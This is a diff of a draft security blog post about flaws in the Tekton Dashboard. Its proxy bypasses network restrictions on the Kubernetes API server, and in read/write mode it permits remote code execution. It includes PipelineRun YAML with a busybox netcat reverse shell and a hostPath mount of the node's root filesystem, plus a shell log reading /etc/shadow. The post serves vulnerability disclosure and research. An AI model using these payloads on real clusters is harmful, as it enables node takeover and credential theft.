@@ -4,10 +4,11 @@ date = 2024-09-03T13:01:44+02:00
 draft = true
 +++
 
-**add introduction**
-this is a story of how i found several dangerous behaviors in tekton cicd
+This is the story of how I found two vulnerabilities in the [Tekton Dashboard](https://github.com/tektoncd/dashboard) that allow remote code execution and a potential node takeover if deployed in `read/write` mode as well as pre-authenticated access to the Kubernetes API server in all modes.
 
-Recently, I stumbled upon an unusual finding. [Nuclei](https://docs.projectdiscovery.io/introduction) reported either an internet-exposed Kubernetes API server, which is not uncommon, or an exposed kubelet API. The latter hadn't been observed in our client's scope before, prompting me to investigate further.
+Both vulnerabilities were treated as intended and are thus still possible. Only the documentation was changed and the  default mode is now `read-only` instead of `read/write`
+
+It started when I stumbled upon an unusual finding during an assessment. [Nuclei](https://docs.projectdiscovery.io/introduction) reported either an internet-exposed Kubernetes API server, which is not too uncommon, or an exposed kubelet API. The latter hadn't been observed in our client's scope before, prompting me to investigate further.
 
 
 ### Kubelet
@@ -156,7 +157,7 @@ func NewProxyHandler(cfg *rest.Config, keepalive time.Duration) (http.Handler, e
 ```
 A noticeable change is the addition of `protectWebSocket(proxy)`, this is a protection against cross-origin websocket hijacking, which is irrelevant as we are not constrained by a browser and therefore able to set arbitrary values for the `origin` header. 
 
-Lastly, the [`ServeOnListener()`](https://github.com/tektoncd/dashboard/blob/main/pkg/router/router.go#L183) function is called on the `http.server` returned by `Register()` which appears to add a CSRF protection:
+Lastly, the [`ServeOnListener()`](https://github.com/tektoncd/dashboard/blob/main/pkg/router/router.go#L183) function is called on the `router.Server` returned by `Register()` which appears to add a CSRF protection:
 
 ```go
 func (s *Server) ServeOnListener(l net.Listener) error {
@@ -169,7 +170,7 @@ func (s *Server) ServeOnListener(l net.Listener) error {
 	return server.Serve(l)
 }
 ```
-By applying `CSRF()` to the original `http.Handler`, a new `csrf` struct ist returned which basically wrapps `ServeHTTP()`. This will in turn be called by `server.Serve(l)`. Then, for http methods deemed unsafe, a hard-coded header with the name `Tekton-Client` is excpected.
+By applying `CSRF()` to the original `http.Handler` inside `router.Server`, a new `csrf` struct is returned which implements the `Handler` interface to wrap `ServeHTTP()`. This will in turn be called by `http.Server.Serve(l)`. Then, for http methods deemed unsafe, a hard-coded HTTP header with the name `Tekton-Client` is expected:
 ```go
 func (cs *csrf) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 	if _, ok := safeMethods[r.Method]; !ok {
@@ -183,15 +184,15 @@ func (cs *csrf) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 	cs.h.ServeHTTP(w, r)
 }
 ```
-add more / something unconstrained etc / mention that adding your own credentials works too
 
-To summarize, if someone adhered to best practices and restricted network access to the Kubernetes API server but has a Tekton dashboard exposed to the internet, we can use its proxy to gain almost unrestricted access to the API server again.
+The value of said header does apparently not matter, we can just set it for all requests to be sure. Other than that there were no restrictions.
 
+**To summarize, if someone adhered to best practices and restricted network access to the Kubernetes API server but has a Tekton dashboard exposed to the internet, we can use its proxy to gain almost unrestricted access to the API server again. Additionally we can either bring our "own" credentials or act with whatever privileges the `tekton-dashboard` service account has.**
 
-For convenience I [patched](https://github.com/fl0mb/kubernetes) kubectl to add the `Tekton-Client` header and to allow authentication when using unencrypted http. Now we can either use the privileges of the `tekton-dashboard` service account:
+For convenience I [patched](https://github.com/fl0mb/kubernetes) kubectl to add the `Tekton-Client` header and to allow authenticating when using unencrypted HTTP. Now we can either use the privileges of the `tekton-dashboard` service account:
 ![](whoami.png)
 
-Or use credentials obtained in another way, for example service account tokens read via a file inclusion vulnerability in a web application:
+Or use credentials obtained in another way, for example, service account tokens read via a file inclusion vulnerability in a web application:
 ![](shell.png)
 
 ### RCE
@@ -210,9 +211,9 @@ Tekton-Client: tektoncd/dashboard
 ...
 ```
 
-This request create a pipelinerun resource so lets find out what that means.
+This request probably creates a PipelineRun resource so lets find out what that means.
 
-Because the path starts with `/apis/` we know we are dealing with a [named api group](https://kubernetes.io/docs/reference/using-api/#api-groups). As `tekton.dev` ist not a built-in group we are dealing with either an ggregated api server or, more commonly a custom resource definition (CRD). We can find the CRD in the pipelines repo:
+Because the path starts with `/apis/` we know we are dealing with a [named api group](https://kubernetes.io/docs/reference/using-api/#api-groups). As `tekton.dev` ist not a built-in group we are dealing with either an aggregated api server or, more commonly a custom resource definition (CRD). We can find the CRD in the pipelines repo:
 
 ```yaml
 apiVersion: apiextensions.k8s.io/v1
@@ -236,7 +237,7 @@ spec:
         type: object
 ...
 ```
-The schema is however not that expressive as it only expects a json object. We did find a document describing the relation at `docs/developers/controller-logic.md`
+The schema is however not that expressive as it only expects a json object. We did however find a document describing the relation at `docs/developers/controller-logic.md`
 
 `pkg/apis/pipeline/v1/pipelinerun_types.go`
 `pkg/apis/pipeline/v1/taskrun_types.go`
@@ -246,14 +247,84 @@ matching reconcilers to create anything:
 
 `pkg/reconciler/taskrun/taskrun.go#createPod()` is where the pod is created
 
+At this point things got complicated and I decided to play around with the functionality first.
+
+At this point I noticed the "Edit an run" button of my existing PipelineRun which presented an editable yaml file:
+
+![](yamlEdit.png)
+
+The `script` key immediately spiked my interest and it was indeed possible to execute arbitrary commands so I went for a shell with:
+
+```yaml
+script: >
+  #!/usr/bin/env sh
+
+  busybox nc 192.168.58.1 8000 -e /bin/sh
+```
+
+RCE is nice but I thought this looks a lot like a normal pod definition, can it do anything malicious like mounting the nodes filesystem?
+
+I tried to get a minimal PipelineRun by repeatedly removing potentially unimportant lines until it breaks, which led me to:
+
+```yaml
+apiVersion: tekton.dev/v1
+kind: PipelineRun
+metadata:
+  annotations: {}
+  generateName: import-resources-1727367416567-2nr95-r-
+  labels:
+    dashboard.tekton.dev/import: 'true'
+    dashboard.tekton.dev/rerunOf: import-resources-1727367416567-2nr95-r-qxptt
+  namespace: tekton-dashboard
+spec:
+  pipelineSpec:
+    tasks:
+      - name: fetch-repo
+        taskSpec:
+          metadata: {}
+          spec: null
+          steps:
+            - computeResources: {}
+              image: busybox:latest
+              name: clone
+              script: |
+                #!/usr/bin/env sh 
+                busybox nc 192.168.49.1 8000 -e /bin/sh
+  taskRunTemplate:
+    serviceAccountName: default
+```
+
+Now we can just mount the hosts filesystem with:
+```yaml
+#...
+    tasks:
+      - name: fetch-repo
+        taskSpec:
+          metadata: {}
+          spec: null
+          steps:
+            - computeResources: {}
+              image: busybox:latest
+              name: clone
+              script: |
+                #!/usr/bin/env sh 
+                busybox nc 192.168.49.1 8000 -e /bin/sh
+              volumeMounts:
+                - mountPath: /var/noderoot
+                  name: noderoot
+          volumes:
+            - hostPath:
+                path: /
+              name: noderoot
+  taskRunTemplate:
+    serviceAccountName: default
+```
+
+![](rce.png)
+
 **play arround with that at home, run taskrun alone, also have log access to the controller any maybe show that**
 
 ----- 
-Ablauf ist etwas unlogisch oben, muss den ganzen code flow zeigen
-parseOptions creates `csrf` struct which has the new ServeHTTP()
-
-makeUpgradeTransport gleich wie bei kubernetes?
-
 welche rechte nochmal? kann ich auch direkt einen taskrun anlegen und kein pipelinerun?
 ```
     resources:
@@ -411,6 +482,24 @@ status:
 ```
 
 # Backup
+
+└─$ nc -klnvp 8000                                                                                                                                 130 ⨯
+Listening on 0.0.0.0 8000
+Connection received on 192.168.49.2 42195
+id
+uid=0(root) gid=0(root) groups=0(root),10(wheel)
+cat /var/noderoot/etc/shadow
+root:*:19840:0:99999:7:::
+daemon:*:19840:0:99999:7:::
+bin:*:19840:0:99999:7:::
+sys:*:19840:0:99999:7:::
+sync:*:19840:0:99999:7:::
+games:*:19840:0:99999:7:::
+man:*:19840:0:99999:7:::
+lp:*:19840:0:99999:7:::
+mail:*:19840:0:99999:7:::
+
+
 ```
 └─$ ./kubectl-patch auth whoami --server='http://tekton-dashboard:9097'
 ATTRIBUTE                                      VALUE
